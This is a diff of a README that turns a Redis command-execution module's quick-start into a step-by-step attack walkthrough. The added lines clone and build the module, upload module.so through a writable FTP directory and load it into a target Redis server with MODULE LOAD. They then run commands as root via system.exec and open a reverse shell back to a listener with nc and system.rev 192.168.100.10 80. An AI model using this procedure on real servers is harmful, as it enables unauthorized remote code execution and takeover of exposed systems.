@@ -1,22 +1,34 @@
-# RedisModules-ExecuteCommand
+# Redis Server Module Load Command Execution
 
-## Quick Start Guide
-
-Here's what you need to do to build your first module:
-
-0. Build Redis in a build supporting modules.
-1. Build librmutil and the module by running `make`. (you can also build them seperatly by running `make` in their respective dirs)
-2. Run redis loading the module: `/path/to/redis-server --loadmodule ./module.so`
-
-Now run `redis-cli` and try the commands:
-
+# Usage
+## compile module.so
+```bash
+git clone https://github.com/binaryxploit/redis-module-load-cmd-exec.git
+cd ./redis-module-load-cmd-exec
+make
 ```
-127.0.0.1:6379> system.exec "id"
-"uid=0(root) gid=0(root) groups=0(root)\n"
-127.0.0.1:6379> system.exec "whoami"
-"root\n"
-127.0.0.1:6379> system.rev 127.0.0.1 9999
+## Find a way to upload module.so - POC
+- Example: 
+- ftp access with writable pub directory.
+- PATH `/var/ftp/pub/`
 ```
+ftp> put module.so
+```
+## Load the module via `redis-cli` tool for command execution
+```bash
+# Required tools
+sudo apt-get install redis-tools -y
 
-Enjoy!
-    
+# Load module.so form uploaded path
+REDIS-CLI:6379> MODULE LOAD /var/ftp/pub/module.so
+
+# List Loaded modules
+REDIS-CLI:6379> MODULE LIST
+
+# Command Execution
+REDIS-CLI:6379> system.exec "id"
+
+# Reverse Shell
+nc -nvlp 80
+REDIS-CLI:6379> system.rev 192.168.100.10 80
+```
